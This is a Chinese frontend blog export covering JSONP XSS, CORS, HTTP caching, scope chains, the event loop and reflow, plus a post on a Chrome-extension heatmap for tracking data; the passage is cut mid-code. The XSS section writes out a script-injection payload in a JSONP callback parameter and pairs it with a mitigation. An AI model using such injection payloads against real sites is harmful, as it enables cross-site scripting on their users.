<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>不严谨的 content-type导致的 XSS 漏洞，想象一下 JSONP 就是你请求 <a href="http://youdomain.com?callback=douniwan" target="_blank" rel="noopener">http://youdomain.com?callback=douniwan</a>, 然后返回 douniwan({ data })，那假如请求 <a href="http://youdomain.com?callback=`" target="_blank" rel="noopener">http://youdomain.com?callback=`</a><script>alert(1)</script><code>不就返回</code><script>alert(1)</script>({ data })`了吗，如果没有严格定义好 Content-Type（ Content-Type: application/json ），再加上没有过滤 callback 参数，直接当 html 解析了，就是一个赤裸裸的 XSS 了。</p>
<p>解决方法：严格定义 Content-Type: application/json，然后严格过滤 callback 后的参数并且限制长度（进行字符转义，例如&lt;换成&amp;lt，&gt;换成&amp;gt）等，这样返回的脚本内容会变成文本格式，脚本将不会执行。</p>
<h1 id="服务器被黑，返回一串恶意执行的代码"><a href="#服务器被黑，返回一串恶意执行的代码" class="headerlink" title="服务器被黑，返回一串恶意执行的代码"></a>服务器被黑，返回一串恶意执行的代码</h1><p>可以将执行的代码转发到服务端进行校验JSONP内容校验，再返回校验结果。</p>
<h1 id="CORS（跨域资款共享）"><a href="#CORS（跨域资款共享）" class="headerlink" title="CORS（跨域资款共享）"></a>CORS（跨域资款共享）</h1><h2 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h2><p>CORS（跨域资源共享 Cross-origin resource sharing）允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服跨域问题，它需要浏览器和服务器的同时支持。</p>
<ol>
<li>浏览器端会自动向请求头添加origin字段，表明当前请求来源。</li>
<li>服务器端需要设置响应头的Access-Control-Allow-Methods，Access-Control-Allow-Headers，Access-Control-Allow-Origin等字段，指定允许的方法，头部，源等信息。</li>
<li>请求分为简单请求和非简单请求，非简单请求会先进行一次OPTION方法进行预检，看是否允许当前跨域请求。</li>
</ol>
<h2 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h2><p>请求方法是以下三种方法之一：</p>
<ol>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ol>
<p>HTTP的请求头信息不超出以下几种字段：</p>
<ol>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</li>
</ol>
<h2 id="后端的响应头信息："><a href="#后端的响应头信息：" class="headerlink" title="后端的响应头信息："></a>后端的响应头信息：</h2><ol>
<li>Access-Control-Allow-Origin：该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</li>
<li>Access-Control-Allow-Credentials：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。</li>
<li>Access-Control-Expose-Headers：该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。</li>
</ol>
<h2 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h2><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。</p>
<ol>
<li><p>Access-Control-Request-Method：该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</p>
</li>
<li><p>Access-Control-Request-Headers：该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p>
</li>
</ol>
<p>如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。</p>
<h1 id="JSONP和CORS的对比"><a href="#JSONP和CORS的对比" class="headerlink" title="JSONP和CORS的对比"></a>JSONP和CORS的对比</h1><ol>
<li>JSONP只支持GET请求，CORS支持所有类型的HTTP请求</li>
<li>JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据</li>
</ol>
<h1 id="其他跨域解决方案"><a href="#其他跨域解决方案" class="headerlink" title="其他跨域解决方案"></a>其他跨域解决方案</h1><ol>
<li>Nginx反向代理</li>
<li>postMessage</li>
<li>document.domain</li>
</ol>
<h2 id="HTTP2和HTTP1有什么区别"><a href="#HTTP2和HTTP1有什么区别" class="headerlink" title="HTTP2和HTTP1有什么区别"></a>HTTP2和HTTP1有什么区别</h2><p>相对于HTTP1.0，HTTP1.1的优化：</p>
<ol>
<li>缓存处理：多了Entity tag，If-Unmodified-Since, If-Match, If-None-Match等缓存信息（HTTTP1.0 If-Modified-Since,Expires）</li>
<li>带宽优化及网络连接的使用</li>
<li>错误通知的管理</li>
<li>Host头处理</li>
<li>长连接： HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</li>
</ol>
<p>相对于HTTP1.1，HTTP2的优化：</p>
<ol>
<li>HTTP2支持二进制传送（实现方便且健壮），HTTP1.x是字符串传送</li>
<li>HTTP2支持多路复用</li>
<li>HTTP2采用HPACK压缩算法压缩头部，减小了传输的体积</li>
<li>HTTP2支持服务端推送</li>
</ol>
<h1 id="你能说说缓存么"><a href="#你能说说缓存么" class="headerlink" title="你能说说缓存么???"></a>你能说说缓存么???</h1><p>缓存分为强缓存和协商缓存。强缓存不过服务器，协商缓存需要过服务器，协商缓存返回的状态码是304。两类缓存机制可以同时存在，强缓存的优先级高于协商缓存。当执行强缓存时，如若缓存命中，则直接使用缓存数据库中的数据，不再进行缓存协商。</p>
<h2 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h2><p>Expires(HTTP1.0)：Exprires的值为服务端返回的数据到期时间。当再次请求时的请求时间小于返回的此时间，则直接使用缓存数据。但由于服务端时间和客户端时间可能有误差，这也将导致缓存命中的误差。另一方面，Expires是HTTP1.0的产物，故现在大多数使用Cache-Control替代。</p>
<p>缺点：使用的是绝对时间，如果服务端和客户端的时间产生偏差，那么会导致命中缓存产生偏差。</p>
<p>Pragma(HTTP1.0)：HTTP1.0时的遗留字段，当值为”no-cache”时强制验证缓存，Pragma禁用缓存，如果又给Expires定义一个还未到期的时间，那么Pragma字段的优先级会更高。服务端响应添加’Pragma’: ‘no-cache’，浏览器表现行为和刷新(F5)类似。</p>
<p>Cache-Control(HTTP1.1)：有很多属性，不同的属性代表的意义也不同：</p>
<p>private：客户端可以缓存<br>public：客户端和代理服务器都可以缓存<br>max-age=t：缓存内容将在t秒后失效<br>no-cache：需要使用协商缓存来验证缓存数据<br>no-store：所有内容都不会缓存</p>
<p>请注意no-cache指令很多人误以为是不缓存，这是不准确的，no-cache的意思是可以缓存，但每次用应该去想服务器验证缓存是否可用。no-store才是不缓存内容。当在首部字段Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。命中强缓存的表现形式：Firefox浏览器表现为一个灰色的200状态码。Chrome浏览器状态码表现为200 (from disk cache)或是200 OK (from memory cache)。</p>
<h2 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h2><p>协商缓存需要进行对比判断是否可以使用缓存。浏览器第一次请求数据时，服务器会将缓存标识与数据一起响应给客户端，客户端将它们备份至缓存中。再次请求时，客户端会将缓存中的标识发送给服务器，服务器根据此标识判断。若未失效，返回304状态码，浏览器拿到此状态码就可以直接使用缓存数据了。</p>
<p>Last-Modified：服务器在响应请求时，会告诉浏览器资源的最后修改时间。</p>
<p>if-Modified-Since：浏览器再次请求服务器的时候，请求头会包含此字段，后面跟着在缓存中获得的最后修改时间。服务端收到此请求头发现有</p>
<p>if-Modified-Since，则与被请求资源的最后修改时间进行对比，如果一致则返回304和响应报文头，浏览器只需要从缓存中获取信息即可。</p>
<p>如果真的被修改：那么开始传输响应一个整体，服务器返回：200 OK<br>如果没有被修改：那么只需传输响应header，服务器返回：304 Not Modified</p>
<p>if-Unmodified-Since: 从某个时间点算起, 是否文件没有被修改，使用的是相对时间，不需要关心客户端和服务端的时间偏差。</p>
<p>如果没有被修改：则开始`继续’传送文件，服务器返回: 200 OK</p>
<p>如果文件被修改：则不传输，服务器返回: 412 Precondition failed (预处理错误)</p>
<p>这两个的区别是一个是修改了才下载一个是没修改才下载。如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为Last-Modified时间匹配不上而返回了整个实体给客户端（即使客户端缓存里有个一模一样的资源）。为了解决这个问题，HTTP1.1推出了Etag。</p>
<p>Etag：服务器响应请求时，通过此字段告诉浏览器当前资源在服务器生成的唯一标识（生成规则由服务器决定）</p>
<p>If-Match：条件请求，携带上一次请求中资源的ETag，服务器根据这个字段判断文件是否有新的修改</p>
<p>If-None-Match： 再次请求服务器时，浏览器的请求报文头部会包含此字段，后面的值为在缓存中获取的标识。服务器接收到次报文后发现</p>
<p>If-None-Match则与被请求资源的唯一标识进行对比。</p>
<p>不同，说明资源被改动过，则响应整个资源内容，返回状态码200。<br>相同，说明资源无心修改，则响应header，浏览器直接从缓存中获取数据信息。返回状态码304.</p>
<p>但是实际应用中由于Etag的计算是使用算法来得出的，而算法会占用服务端计算的资源，所有服务端的资源都是宝贵的，所以就很少使用Etag了。</p>
<p>浏览器地址栏中写入URL，回车浏览器发现缓存中有这个文件了，不用继续请求了，直接去缓存拿（最快）</p>
<p>F5就是告诉浏览器，别偷懒，好歹去服务器看看这个文件是否有过期了。于是浏览器就胆胆襟襟的发送一个请求带上If-Modify-since</p>
<p>Ctrl+F5告诉浏览器，你先把你缓存中的这个文件给我删了，然后再去服务器请求个完整的资源文件下来。于是客户端就完成了强行更新的操作</p>
<h2 id="缓存场景"><a href="#缓存场景" class="headerlink" title="缓存场景"></a>缓存场景</h2><p>对于大部分的场景都可以使用强缓存配合协商缓存解决，但是在一些特殊的地方可能需要选择特殊的缓存策略</p>
<p>对于某些不需要缓存的资源，可以使用 Cache-control: no-store ，表示该资源不需要缓存<br>对于频繁变动的资源，可以使用 Cache-Control: no-cache 并配合 ETag 使用，表示该资源已被缓存，但是每次都会发送请求询问资源是否更新<br>对于代码文件来说，通常使用 Cache-Control: max-age=31536000 并配合策略缓存使用，然后对文件进行指纹处理，一旦文件名变动就会立刻下载新的文件</p>
<h1 id="能说说首屏加载优化有哪些方案么"><a href="#能说说首屏加载优化有哪些方案么" class="headerlink" title="能说说首屏加载优化有哪些方案么"></a>能说说首屏加载优化有哪些方案么</h1><ol>
<li>Vue-Router路由懒加载（利用Webpack的代码切割）</li>
<li>使用CDN加速，将通用的库从vendor进行抽离</li>
<li>Nginx的gzip压缩</li>
<li>Vue异步组件</li>
<li>服务端渲染SSR</li>
<li>如果使用了一些UI库，采用按需加载</li>
<li>Webpack开启gzip压缩</li>
<li>如果首屏为登录页，可以做成多入口</li>
<li>Service Worker缓存文件处理</li>
<li>使用link标签的rel属性设置   prefetch（这段资源将会在未来某个导航或者功能要用到，但是本资源的下载顺序权重比较低，prefetch通常用于加速下一次导航）、preload（preload将会把资源得下载顺序权重提高，使得关键数据提前下载好，优化页面打开速度）</li>
</ol>
<h1 id="如何在Node端配置路径别名（类似于Webpack中的alias配置）"><a href="#如何在Node端配置路径别名（类似于Webpack中的alias配置）" class="headerlink" title="如何在Node端配置路径别名（类似于Webpack中的alias配置）"></a>如何在Node端配置路径别名（类似于Webpack中的alias配置）</h1><ol>
<li>全局变量</li>
<li>环境变量</li>
<li>自己HACK一个@符号，指向特定的路径</li>
<li>HACK require方法</li>
</ol>
<h1 id="谈谈你对作用域链的理解"><a href="#谈谈你对作用域链的理解" class="headerlink" title="谈谈你对作用域链的理解"></a>谈谈你对作用域链的理解</h1><p>了解作用域链之前我们要知道一下几个概念：</p>
<ol>
<li>函数的生命周期</li>
<li>变量和函数的声明</li>
<li>Activetion Object（AO）、Variable Object（VO）</li>
</ol>
<p>函数的生命周期：</p>
<ol>
<li><p>创建：JS解析引擎进行预解析，会将函数声明提前，同时将该函数放到全局作用域中或当前函数的上一级函数的局部作用域中。</p>
</li>
<li><p>执行：JS引擎会将当前函数的局部变量和内部函数进行声明提前，然后再执行业务代码，当函数执行完退出时，释放该函数的执行上下文，并注销该函数的局部变量。</p>
</li>
</ol>
<p>变量和函数的声明：如果变量名和函数名声明时相同，函数优先声明。</p>
<p>Activetion Object（AO）、Variable Object（VO）：</p>
<ol>
<li>AO：Activetion Object（活动对象）</li>
<li>VO：Variable Object（变量对象）</li>
</ol>
<p>VO对应的是函数创建阶段，JS解析引擎进行预解析时，所有的变量和函数的声明，统称为Variable Object。该变量与执行上下文相关，知道自己的数据存储在哪里，并且知道如何访问。VO是一个与执行上下文相关的特殊对象，它存储着在上下文中声明的以下内容：</p>
<p>变量 (var, 变量声明);<br>函数声明 (FunctionDeclaration, 缩写为FD);<br>函数的形参</p>
<p>AO对应的是函数执行阶段，当函数被调用执行时，会建立一个执行上下文，该执行上下文包含了函数所需的所有变量，该变量共同组成了一个新的对象就是Activetion Object。该对象包含了：</p>
<p>函数的所有局部变量<br>函数的所有命名参数<br>函数的参数集合<br>函数的this指向</p>
<p>作用域链：<br>当代码在一个环境中创建时，会创建变量对象的一个作用域链（scope chain）来保证对执行环境有权访问的变量和函数。作用域第一个对象始终是当前执行代码所在环境的变量对象（VO）。如果是函数执行阶段，那么将其activation object（AO）作为作用域链第一个对象，第二个对象是上级函数的执行上下文AO，下一个对象依次类推。<br>在《JavaScript深入之变量对象》中讲到，当查找变量的时候，会先从当前上下文的变量对象中查找，如果没有找到，就会从父级(词法层面上的父级)执行上下文的变量对象中查找，一直找到全局上下文的变量对象，也就是全局对象。这样由多个执行上下文的变量对象构成的链表就叫做作用域链。</p>
<h1 id="了解Event-Loop么"><a href="#了解Event-Loop么" class="headerlink" title="了解Event Loop么"></a>了解Event Loop么</h1><p>事件触发线程管理的任务队列是如何产生的呢？事实上这些任务就是从JS引擎线程本身产生的，主线程在运行时会产生执行栈，栈中的代码调用某些异步API时会在任务队列中添加事件，栈中的代码执行完毕后，就会读取任务队列中的事件，去执行事件对应的回调函数，如此循环往复，形成事件循环机制。JS中有两种任务类型：微任务（microtask）和宏任务（macrotask），在ES6中，microtask称为 jobs，macrotask称为 task：</p>
<p>宏任务： script （主代码块）、setTimeout 、setInterval 、setImmediate 、I/O 、UI rendering</p>
<p>微任务：process.nextTick（Nodejs） 、Promise 、Object.observe 、MutationObserver</p>
<p>Node.js中Event Loop和浏览器中Event Loop有什么区别</p>
<h1 id="如何避免触发回流和重绘"><a href="#如何避免触发回流和重绘" class="headerlink" title="如何避免触发回流和重绘"></a>如何避免触发回流和重绘</h1><p>CSS：</p>
<p>避免使用table布局。<br>尽可能在DOM树的最末端改变class。<br>避免设置多层内联样式。<br>将动画效果应用到position属性为absolute或fixed的元素上<br>避免使用CSS表达式（例如：calc()）<br>CSS3硬件加速（GPU加速）</p>
<p>JavaScript：</p>
<p>避免频繁操作样式，最好一次性重写style属性，或者将样式列表定义为class并一次性更改class属性<br>避免频繁操作DOM，创建一个documentFragment，在它上面应用所有DOM操作，最后再把它添加到文档中<br>也可以先为元素设置display: none，操作结束后再把它显示出来。因为在display属性为none的元素上进行的DOM操作不会引发回流和重绘<br>避免频繁读取会引发回流/重绘的属性，如果确实需要多次使用，就用一个变量缓存起来<br>对具有复杂动画的元素使用绝对定位，使它脱离文档流，否则会引起父元素及后续元素频繁回流</p>
]]></content>
  </entry>
  <entry>
    <title>webpack4文档</title>
    <url>/2020/10/30/webpack4%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<p>webpack4文档<br><a id="more"></a></p>
<p>loader 用于转换某些类型的模块，而插件则可以用于执行范围更广的任务。包括：打包优化，资源管理，注入环境变量。</p>
]]></content>
  </entry>
  <entry>
    <title>无埋点可视化插件的实现</title>
    <url>/2020/11/06/%E5%9F%8B%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>无埋点可视化插件的实现</p>
<a id="more"></a>
<h1 id="功能演示"><a href="#功能演示" class="headerlink" title="功能演示"></a>功能演示</h1><p><img src="https://file-stores.oss-cn-beijing.aliyuncs.com/blog/zan-data/zandata-show.gif" alt></p>
<p>如图所示，插件的主要功能有：</p>
<ol>
<li>打开任意接过埋点sdk的页面，就可以很方便地查看页面及页面元素的pv、uv数据。</li>
<li>在右侧出现的抽屉中可进行多维度（省份、客户端、用户ID…）的筛选。</li>
<li>点击率排行、访问趋势、一键跳转神策分析等功能。</li>
</ol>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>无埋点可视化插件是基于Chrome浏览器插件实现的，可以在完全不改动埋点sdk代码的情况下，将无埋点数据可视化地呈现，满足常规的页面分析需求。</p>
<p>由于是无埋点，每新上一个页面，投入的埋点开发量几乎为零。</p>
<h1 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h1><p>一开始我分析了growing.io的技术方案，它是通过iframe实现的。但是由于业务页面和埋点平台是跨域的，用户操作是在埋点平台上，绘制可视化数据则一定要在业务页面里做。这就必然需要埋点sdk提供两点支持：1.绘制可视化数据，2.与埋点平台可以双向通信。这会提高sdk的复杂度和耦合度，并且当时sdk还是由其他团队负责维护的，所以我们还是想尽量不改动sdk代码，于是想到了Chrome插件。</p>
<p>经过调研，Chrome插件的content script(内容脚本)是没有跨域问题的，也就是说理论上能实现我们的功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;所谓content-scripts，其实就是Chrome插件中向页面注入脚本的一种形式（虽然名为script，其实还可以包括css的），借助content-scripts我们可以实现通过配置的方式轻松向指定页面注入JS和CSS，最常见的比如：广告屏蔽、页面CSS定制，等等。&quot;</span><br></pre></td></tr></table></figure>
<h1 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h1><p>无埋点可视化插件在网上并没有找到类似的产品，下面介绍一下它的实现细节。</p>
<h2 id="数据绘制"><a href="#数据绘制" class="headerlink" title="数据绘制"></a>数据绘制</h2><p>无埋点数据可视化是通过热力图绘制原理实现的，常规的热力图是块状的，虽然第一眼看上去美观些，但用处有限，最终还是需要展示具体的pv、uv数据。所以我们就改造了热力图，直接在元素上展示对应的uv数据，再通过色带映射体现uv值的大小（热力图其实也是这个原理）。最后，hover元素时会出现toolTip，我们在toolTip中展示该元素更丰富的数据。</p>
<p>下面介绍下实现的逻辑。</p>
<p>首先通过AppID和当前页面的url就可以查询出该页面所有元素的无埋点数据。数据格式类似这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> elementPvUvList = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"pv"</span>: <span class="number">1000</span>,</span><br><span class="line">    <span class="string">"uv"</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">"xpath"</span>: <span class="string">"//*[@id=\"logo\"]"</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>拿到元素的xpath,我们利用content script可以在业务页面中拿到该元素。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getElmByXPath = <span class="function">(<span class="params">xpath</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!xpath) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="built_in">document</span>.evaluate(xpath, <span class="built_in">document</span>, <span class="literal">null</span>, XPathResult.ANY_TYPE, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> result.iterateNext();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">'getElmByXPath err is: '</span>, e.toString());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拿到元素后我们就可以获取元素的位置信息进行绘制了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vWidth  = <span class="built_in">window</span>.innerWidth,</span><br><span class="line">  vHeight = <span class="built_in">window</span>.innerHeight,</span><br><span class="line">  scrollX = <span class="built_in">document</span>.documentElement.scrollLeft,</span><br><span class="line">  scrollY = <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line"></span><br><span class="line">elementPvUvList.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> pv = <span class="built_in">Number</span>(item.pv);</span><br><span class="line">  <span class="keyword">const</span> uv = <span class="built_in">Number</span>(item.uv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> elm = getElmByXPath(item.xpath)</span><br><span class="line">  <span class="keyword">const</span> rect = getBoundingClientRect(elm);</span><br><span class="line">  <span class="comment">// isElementVisible 判断元素是否可见，后面会介绍</span></span><br><span class="line">  <span class="keyword">if</span> (!isElementVisible(elm, rect, vWidth, vHeight)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> &#123; left, top &#125; = rect;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mapPointFillStyle 色带映射，后面会介绍</span></span><br><span class="line">  drawMapCtx.fillStyle = mapPointFillStyle;</span><br><span class="line">  <span class="keyword">const</span> mapPointWidth = <span class="built_in">String</span>(pv).length * <span class="number">8.5</span>;</span><br><span class="line">  drawMapCtx.fillRect(left + scrollX, top + scrollY, mapPointWidth, <span class="number">12</span>);</span><br><span class="line">  drawMapCtx.fillStyle = <span class="string">'#fff'</span>;</span><br><span class="line">  drawMapCtx.fillText(pv, left + scrollX, top + scrollY);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>drawMapCtx是我们的热力图绘制容器canvas的context。</p>
<p>canvas的实现如下，它可以让canvas完全覆盖业务页面（scrollWidth、scrollHeight）、处于页面最顶层（z-index）、没有高清屏上模糊的问题（devicePixelRatio）、不影响页面上的事件触发（pointer-events）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> TCE_HEATMAP_CONTAINER = <span class="string">'tce-heatmap-container'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> body = <span class="built_in">document</span>.body;</span><br><span class="line"><span class="keyword">const</span> width = body.scrollWidth;</span><br><span class="line"><span class="keyword">const</span> height = body.scrollHeight;</span><br><span class="line"><span class="keyword">const</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line"><span class="keyword">const</span> firstChild = <span class="built_in">document</span>.body.children[<span class="number">0</span>];</span><br><span class="line">canvas.id = TCE_HEATMAP_CONTAINER;</span><br><span class="line"><span class="built_in">document</span>.body.insertBefore(canvas, firstChild);</span><br><span class="line">canvas.style.width = width + <span class="string">'px'</span>;</span><br><span class="line">canvas.style.height = height + <span class="string">'px'</span>;</span><br><span class="line"><span class="keyword">const</span> dpr = <span class="built_in">window</span>.devicePixelRatio;</span><br><span class="line">canvas.width = dpr * width;</span><br><span class="line">canvas.height = dpr * height;</span><br><span class="line"><span class="keyword">const</span> drawMapCtx = <span class="built_in">document</span>.getElementById(TCE_HEATMAP_CONTAINER).getContext(<span class="string">'2d'</span>);</span><br><span class="line">drawMapCtx.scale(dpr, dpr);</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#tce-heatmap-container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2000000000</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mapPointFillStyle就是借鉴热力图的实现原理对uv做的色带映射：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getColorPalette.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> colorPalette = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getColorPalette = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (colorPalette) &#123;</span><br><span class="line">    <span class="keyword">return</span> colorPalette;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> gradientConfig = &#123; <span class="number">0.25</span>: <span class="string">'rgb(0,0,255)'</span>, <span class="number">0.55</span>: <span class="string">'rgb(0,255,0)'</span>, <span class="number">0.85</span>: <span class="string">'yellow'</span>, <span class="number">1.0</span>: <span class="string">'rgb(255,0,0)'</span> &#125;;</span><br><span class="line">  <span class="keyword">const</span> paletteCanvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line">  <span class="keyword">const</span> paletteCtx = paletteCanvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line"></span><br><span class="line">  paletteCanvas.width = <span class="number">256</span>;</span><br><span class="line">  paletteCanvas.height = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> gradient = paletteCtx.createLinearGradient(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> gradientConfig) &#123;</span><br><span class="line">    gradient.addColorStop(key, gradientConfig[key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  paletteCtx.fillStyle = gradient;</span><br><span class="line">  paletteCtx.fillRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  colorPalette = paletteCtx.getImageData(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">1</span>).data</span><br><span class="line">  <span class="keyword">return</span> colorPalette;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> getColorPalette;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> getColorPalette <span class="keyword">from</span> <span class="string">'../utils/getColorPalette'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> OPACITY = <span class="number">0.45</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> uvList = elementPvUvList.map(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">Number</span>(item.uv));</span><br><span class="line"><span class="keyword">const</span> maxUV = <span class="built_in">Math</span>.max(...uvList);</span><br><span class="line"><span class="keyword">const</span> minUV = <span class="built_in">Math</span>.min(...uvList);</span><br><span class="line"><span class="keyword">const</span> colorPalette = getColorPalette();</span><br><span class="line"></span><br><span class="line">elementPvUvList.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> pv = <span class="built_in">Number</span>(item.pv);</span><br><span class="line">  <span class="keyword">let</span> alpha = <span class="built_in">Math</span>.ceil((uv - minUV) * <span class="number">256</span> / (maxUV - minUV));</span><br><span class="line">  alpha = alpha &lt; <span class="number">1</span> ? <span class="number">1</span> : alpha;</span><br><span class="line">  <span class="keyword">const</span> r = colorPalette[alpha * <span class="number">4</span> - <span class="number">4</span>];</span><br><span class="line">  <span class="keyword">const</span> g = colorPalette[alpha * <span class="number">4</span> - <span class="number">3</span>];</span><br><span class="line">  <span class="keyword">const</span> b = colorPalette[alpha * <span class="number">4</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">const</span> mapPointFillStyle = <span class="string">`rgba(<span class="subst">$&#123;r&#125;</span>, <span class="subst">$&#123;g&#125;</span>, <span class="subst">$&#123;b&#125;</span>, <span class="subst">$&#123;OPACITY&#125;</span>)`</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>isElementVisible方法判可以断元素在视口内是否可见，我们只需绘制视口内可见元素的数据，从而获得了性能的提升。它的实现如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> visibleDiffX = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> visibleDiffY = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> elementFromPoint = <span class="function">(<span class="params">x, y</span>) =&gt;</span> <span class="built_in">document</span>.elementFromPoint(x, y);</span><br><span class="line"><span class="keyword">const</span> isElementVisible = <span class="function">(<span class="params">el, rect, vWidth, vHeight</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    rect.right &lt; <span class="number">0</span> ||</span><br><span class="line">    rect.bottom &lt; <span class="number">0</span> ||</span><br><span class="line">    rect.left &gt; vWidth ||</span><br><span class="line">    rect.top &gt; vHeight</span><br><span class="line">  ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> rectCt = elementFromPoint(rect.left + rect.width / <span class="number">2</span>,  rect.top + rect.height / <span 